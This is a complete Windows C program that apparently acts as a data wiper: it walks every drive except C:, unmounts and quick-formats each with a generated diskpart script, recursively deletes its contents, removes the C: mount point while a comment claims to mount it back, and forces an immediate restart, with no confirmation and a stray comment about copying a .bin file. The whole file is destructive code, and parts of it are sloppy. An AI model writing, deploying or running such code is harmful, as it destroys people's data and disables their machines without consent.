#include <windows.h>
#include <stdio.h>
#include <tchar.h>

void UnmountVolume(const wchar_t* volumePath) {
    TCHAR command[MAX_PATH + 50];
    _stprintf_s(command, MAX_PATH + 50, _T("mountvol %s /D"), volumePath);
    _tsystem(command);
}
void PlaySoundEffect() {
    // Play a beep sound
    MessageBeep(MB_ICONERROR);
}
void FormatDrive(const wchar_t* drivePath) {
    // Unmount the volume
    UnmountVolume(drivePath);

    // Construct the diskpart script
    TCHAR script[MAX_PATH + 50];
    _stprintf_s(script, MAX_PATH + 50, _T("select volume %s\r\nformat fs=fat32 quick\r\n"), drivePath);

    // Create a temporary script file
    TCHAR scriptPath[MAX_PATH];
    GetTempPath(MAX_PATH, scriptPath);
    _tcscat_s(scriptPath, MAX_PATH, _T("diskpart_script.txt"));

    // Write the script to the file
    FILE* scriptFile;
    _tfopen_s(&scriptFile, scriptPath, _T("w"));
    _fputts(script, scriptFile);
    fclose(scriptFile);

    // Execute diskpart with the script
    _stprintf_s(script, MAX_PATH + 50, _T("diskpart /s %s"), scriptPath);
    _tsystem(script);

    // Delete the temporary script file
    DeleteFile(scriptPath);
}

void RemoveContents(const wchar_t* drivePath) {
    TCHAR command[MAX_PATH + 50];
    _stprintf_s(command, MAX_PATH + 50, _T("rd /s /q %s\\*"), drivePath);
    _tsystem(command);
}

void MountCVolume() {
    // Mount the C: volume
    TCHAR command[MAX_PATH + 50];
    _stprintf_s(command, MAX_PATH + 50, _T("mountvol C:\\ /d"));
    _tsystem(command);
}

void RestartSystem() {
    // Restart the system
    _tsystem(_T("shutdown -r -t 0"));
}

int main() {
    wchar_t logicalDrives[MAX_PATH];
    PlaySoundEffect();

    // Get all logical drive paths
    if (GetLogicalDriveStrings(MAX_PATH, logicalDrives) == 0) {
        wprintf(L"Error getting logical drive strings: %lu\n", GetLastError());
        return 1;
    }
    PlaySoundEffect();

    // Iterate through logical drives
    for (wchar_t* drivePath = logicalDrives; *drivePath != L'\0'; drivePath += 4) {
        if (drivePath[0] == L'C') {
            wprintf(L"Skipping C: drive.\n");
            continue; // Skip C: drive
            PlaySoundEffect();
        }
        PlaySoundEffect();

        wprintf(L"Checking drive: %s\n", drivePath);
        PlaySoundEffect();

        // Format the drive using diskpart
        FormatDrive(drivePath);
        PlaySoundEffect();

        // Copy the .bin file to the drive
        PlaySoundEffect();

        // Remove the contents of the drive
        RemoveContents(drivePath);
    }
    PlaySoundEffect();

    // Mount the C: volume back
    MountCVolume();
    PlaySoundEffect();
    PlaySoundEffect();
    PlaySoundEffect();

    // Wait for 5 second
    Sleep(5000);
    PlaySoundEffect();

    // Restart the system
    RestartSystem();
    PlaySoundEffect();

    wprintf(L"Operation completed.\n");

    return 0;
}